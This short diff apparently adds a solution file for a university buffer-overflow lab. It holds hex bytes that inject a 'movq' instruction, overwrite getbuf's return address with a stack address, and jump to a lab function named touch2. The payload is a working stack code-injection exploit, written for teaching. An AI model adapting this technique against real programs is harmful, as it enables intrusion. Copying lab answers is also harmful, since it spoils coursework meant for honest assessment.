@@ -1,0 +1,13 @@
+/* Objdump of the movq */
+48 c7 c7 a5 2c f7 33 c3
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+
+/* Ret address of getbuf */
+/* 0x401cf4 */
+/* 0x5553a860 */
+60 a8 53 55 00 00 00 00
+
+/* Ret address of touch2 */
+/* 0x401d4e */
+4e 1d 40 00 00 00 00 00
